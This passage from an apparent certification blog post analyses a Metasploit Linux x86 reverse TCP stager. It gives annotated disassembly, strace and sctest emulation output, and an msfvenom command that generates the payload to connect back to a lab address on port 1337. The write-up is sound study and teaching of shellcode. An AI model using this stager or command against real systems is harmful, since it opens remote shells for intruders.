</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000000</span><span class=no>C</span>  <span class=no>B066</span>              <span class=no>mov</span> <span class=no>al</span><span class=p>,</span><span class=mi>0x66</span>             <span class=c>; socketcall()
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000000</span><span class=no>E</span>  <span class=mi>89</span><span class=no>E1</span>              <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span><span class=no>esp</span>             <span class=c>; socket() arguments used in second parameter for socketcall
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000010</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>
</span></span><span class=line><span class=cl><span class=err>00000012</span>  <span class=err>97</span>                <span class=nf>xchg</span> <span class=no>eax</span><span class=p>,</span><span class=no>edi</span>
</span></span><span class=line><span class=cl><span class=err>00000013</span>  <span class=err>5</span><span class=nf>B</span>                <span class=no>pop</span> <span class=no>ebx</span>
</span></span><span class=line><span class=cl><span class=err>00000014</span>  <span class=err>68</span><span class=nf>C0A80114</span>        <span class=no>push</span> <span class=no>dword</span> <span class=mi>0x1401a8c0</span>   <span class=c>; 192.168.1.20
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000019</span>  <span class=mi>6802000539</span>        <span class=no>push</span> <span class=no>dword</span> <span class=mi>0x39050002</span>   <span class=c>; 1337
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000001</span><span class=no>E</span>  <span class=mi>89</span><span class=no>E1</span>              <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span><span class=no>esp</span>             <span class=c>; sockaddr struct
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000020</span>  <span class=mi>6</span><span class=no>A66</span>              <span class=no>push</span> <span class=no>byte</span> <span class=err>+</span><span class=mi>0x66</span>         <span class=c>; socketcall()
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000022</span>  <span class=mi>58</span>                <span class=no>pop</span> <span class=no>eax</span>
</span></span><span class=line><span class=cl><span class=err>00000023</span>  <span class=err>50</span>                <span class=nf>push</span> <span class=no>eax</span>
</span></span><span class=line><span class=cl><span class=err>00000024</span>  <span class=err>51</span>                <span class=nf>push</span> <span class=no>ecx</span>
</span></span><span class=line><span class=cl><span class=err>00000025</span>  <span class=err>57</span>                <span class=nf>push</span> <span class=no>edi</span>
</span></span><span class=line><span class=cl><span class=err>00000026</span>  <span class=err>89</span><span class=nf>E1</span>              <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span><span class=no>esp</span>             <span class=c>; connect() arguments used in second parameter for socketcall
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000028</span>  <span class=mi>43</span>                <span class=no>inc</span> <span class=no>ebx</span>                 <span class=c>; SYS_CONNECT
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000029</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>                <span class=c>; Execute syscall
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000002</span><span class=no>B</span>  <span class=mi>85</span><span class=no>C0</span>              <span class=no>test</span> <span class=no>eax</span><span class=p>,</span><span class=no>eax</span>            <span class=c>; Test if connect() returned success
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000002</span><span class=no>D</span>  <span class=mi>7919</span>              <span class=no>jns</span> <span class=mi>0x48</span>                <span class=c>; If not zero, jump to 00000048
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000002</span><span class=no>F</span>  <span class=mi>4</span><span class=no>E</span>                <span class=no>dec</span> <span class=no>esi</span>                 <span class=c>; Decrease esi
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000030</span>  <span class=mi>743</span><span class=no>D</span>              <span class=no>jz</span> <span class=mi>0x6f</span>                 <span class=c>; If zero, exit program
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000032</span>  <span class=mi>68</span><span class=no>A2000000</span>        <span class=no>push</span> <span class=no>dword</span> <span class=mi>0xa2</span>
</span></span><span class=line><span class=cl><span class=err>00000037</span>  <span class=err>58</span>                <span class=nf>pop</span> <span class=no>eax</span>                 <span class=c>; syscall sys_nanosleep 162
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000038</span>  <span class=mi>6</span><span class=no>A00</span>              <span class=no>push</span> <span class=no>byte</span> <span class=err>+</span><span class=mi>0x0</span>          <span class=c>; timespec structure tv_nsec
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000003</span><span class=no>A</span>  <span class=mi>6</span><span class=no>A05</span>              <span class=no>push</span> <span class=no>byte</span> <span class=err>+</span><span class=mi>0x5</span>          <span class=c>; timespec structure tv_sec -&gt; Sleep 5 seconds
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000003</span><span class=no>C</span>  <span class=mi>89</span><span class=no>E3</span>              <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=no>esp</span>             <span class=c>; ebx points to timespec structure
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000003</span><span class=no>E</span>  <span class=mi>31</span><span class=no>C9</span>              <span class=no>xor</span> <span class=no>ecx</span><span class=p>,</span><span class=no>ecx</span>             <span class=c>; last argument for sys_nanosleep is zero
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000040</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>                <span class=c>; Execute syscall
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000042</span>  <span class=mi>85</span><span class=no>C0</span>              <span class=no>test</span> <span class=no>eax</span><span class=p>,</span><span class=no>eax</span>
</span></span><span class=line><span class=cl><span class=err>00000044</span>  <span class=err>79</span><span class=nf>BD</span>              <span class=no>jns</span> <span class=mi>0x3</span>                 <span class=c>; if not zero jump to 00000003
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000046</span>  <span class=no>EB27</span>              <span class=no>jmp</span> <span class=no>short</span> <span class=mi>0x6f</span>          <span class=c>; exit program
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000048</span>  <span class=no>B207</span>              <span class=no>mov</span> <span class=no>dl</span><span class=p>,</span><span class=mi>0x7</span>              <span class=c>; reverse shell success fully connected. 7 -&gt; read,write,execute
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000004</span><span class=no>A</span>  <span class=no>B900100000</span>        <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span><span class=mi>0x1000</span>          <span class=c>; size_t len 4096
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000004</span><span class=no>F</span>  <span class=mi>89</span><span class=no>E3</span>              <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=no>esp</span>             <span class=c>; *addr = points to top of the stack
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000051</span>  <span class=no>C1EB0C</span>            <span class=no>shr</span> <span class=no>ebx</span><span class=p>,</span><span class=mi>0xc</span>             <span class=c>; shift ebx 12 bytes to the right
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000054</span>  <span class=no>C1E30C</span>            <span class=no>shl</span> <span class=no>ebx</span><span class=p>,</span><span class=mi>0xc</span>             <span class=c>; shift ebx 12 bytes to the left
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000057</span>  <span class=no>B07D</span>              <span class=no>mov</span> <span class=no>al</span><span class=p>,</span><span class=mi>0x7d</span>             <span class=c>; sys_mprotect 125
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000059</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>                <span class=c>; Execute syscall
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000005</span><span class=no>B</span>  <span class=mi>85</span><span class=no>C0</span>              <span class=no>test</span> <span class=no>eax</span><span class=p>,</span><span class=no>eax</span>            <span class=c>; Test if mprotect() returned success
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000005</span><span class=no>D</span>  <span class=mi>7810</span>              <span class=no>js</span> <span class=mi>0x6f</span>                 <span class=c>; If zero, exit program
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000005</span><span class=no>F</span>  <span class=mi>5</span><span class=no>B</span>                <span class=no>pop</span> <span class=no>ebx</span>                 <span class=c>; file descriptor for read()
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000060</span>  <span class=mi>89</span><span class=no>E1</span>              <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span><span class=no>esp</span>             <span class=c>; move stack pointer to ecx = void *buf
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000062</span>  <span class=mi>99</span>                <span class=no>cdq</span>                     <span class=c>; 
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000063</span>  <span class=no>B224</span>              <span class=no>mov</span> <span class=no>dl</span><span class=p>,</span><span class=mi>0x24</span>             <span class=c>; size_t count = 36 bytes
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000065</span>  <span class=no>B003</span>              <span class=no>mov</span> <span class=no>al</span><span class=p>,</span><span class=mi>0x3</span>              <span class=c>; sys_read 03
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000067</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>                <span class=c>; Execute syscall
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000069</span>  <span class=mi>85</span><span class=no>C0</span>              <span class=no>test</span> <span class=no>eax</span><span class=p>,</span><span class=no>eax</span>            <span class=c>; Test if read() returned success
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000006</span><span class=no>B</span>  <span class=mi>7802</span>              <span class=no>js</span> <span class=mi>0x6f</span>                 <span class=c>; If not zero, exit program
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000006</span><span class=no>D</span>  <span class=no>FFE1</span>              <span class=no>jmp</span> <span class=no>ecx</span>                 <span class=c>; Loop back to ecx
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000006</span><span class=no>F</span>  <span class=no>B801000000</span>        <span class=no>mov</span> <span class=no>eax</span><span class=p>,</span><span class=mi>0x1</span>             <span class=c>; sys_exit 01
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000074</span>  <span class=no>BB01000000</span>        <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=mi>0x1</span>             <span class=c>; Set return value to error
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000079</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>                <span class=c>; Execute syscall
</span></span></span></code></pre></td></tr></table></div></div><p>Compared to other common reverse shell payloads, this one is a little bit different because it performs error checking after each syscall. If an error is detected, simply exit the program. In addition to error checking, it contains a few other features as well. The program will try to connect 10 times before it exits. Between each connection attempt it will also sleep for 5 seconds. Once a connection has been made, <code>mprotect()</code> is called marking the top of the stack readable, writable and executable for the process&rsquo;s memory pages.</p><p>We can dynamically analyse the payload using <code>strace</code> to see which system calls are being made. Because this payload expects shellcode as input, I simply used metasploit&rsquo;s <code>exploit/multi/handler</code> to listen for connections. The image below shows <code>strace</code> on the left and metasploit on the right.</p><p><img src=reverse_shell_tcp.png alt=reverse_shell_tcp.png></p><p>The green line shows the shellcode received from metasploit. Following the <code>strace</code> output, we can see that the shellcode performs an <code>execve()</code> syscall, executing <code>/bin/sh</code> and finally running the command <code>id</code>, sent from metasploit&rsquo;s terminal.</p><p>Another tool we can use for analyzing shellcode is <a href=https://www.aldeid.com/wiki/Libemu/sctest>sctest</a> which can be used for emulating shellcode. Running the following commands will create a graphical image showing which syscalls are being made.</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ msfvenom -p linux/x86/shell/reverse_tcp -a x86 --platform linux lhost=192.168.1.20 lport=1337 -f raw | ~/SLAE/libemu/tools/sctest/sctest -vvv -Ss 100000 -G reverse_tcp.dot
dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ dot reverse_tcp.dot -Tpng -o reverse_tcp.png
</code></pre><p>The generated image:</p><center><img src=reverse_tcp.png alt="reverse tcp with sctest"></center><p>In addition to generating images, <code>sctest</code> will also generate some C code based on the structures used by each syscall. For example, the C code below corresponds to creating a <code>socket</code> and then calling the <code>connect</code> syscall. We can also see the configured port and IP address.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=n>socket</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>     <span class=kt>int</span> <span class=n>domain</span> <span class=o>=</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>     <span class=kt>int</span> <span class=n>type</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>     <span class=kt>int</span> <span class=n>protocol</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>)</span> <span class=o>=</span>  <span class=mi>14</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>connect</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>     <span class=kt>int</span> <span class=n>sockfd</span> <span class=o>=</span> <span class=mi>14</span><span class=p>;</span>
</span></span><span class=line><span class=cl>     <span class=k>struct</span> <span class=n>sockaddr_in</span> <span class=o>*</span> <span class=n>serv_addr</span> <span class=o>=</span> <span class=mh>0x00416fbe</span> <span class=o>=&gt;</span>
</span></span><span class=line><span class=cl>         <span class=k>struct</span>   <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>             <span class=kt>short</span> <span class=n>sin_family</span> <span class=o>=</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>             <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>sin_port</span> <span class=o>=</span> <span class=mi>14597</span> <span class=p>(</span><span class=n>port</span><span class=o>=</span><span class=mi>1337</span><span class=p>);</span>
</span></span><span class=line><span class=cl>             <span class=k>struct</span> <span class=n>in_addr</span> <span class=n>sin_addr</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                 <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>s_addr</span> <span class=o>=</span> <span class=mi>335653056</span> <span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=mf>192.168.1.20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>             <span class=p>};</span>
</span></span><span class=line><span class=cl>             <span class=kt>char</span> <span class=n>sin_zero</span> <span class=o>=</span> <span class=s>&#34;       &#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>         <span class=p>};</span>
</span></span><span class=line><span class=cl>     <span class=kt>int</span> <span class=n>addrlen</span> <span class=o>=</span> <span class=mi>102</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>)</span> <span class=o>=</span>  <span class=mi>0</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>That&rsquo;s it, this was a fun payload to dissect :)</p><hr><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: SLAE-1490</p></article></div><footer></footer></main><script src=/js/particles.min.js defer></script>
<script src=/js/particles.conf.js defer></script>
<script src=/js/baffle.min.js async></script>
<script src=/js/main.js defer async></script></body></html>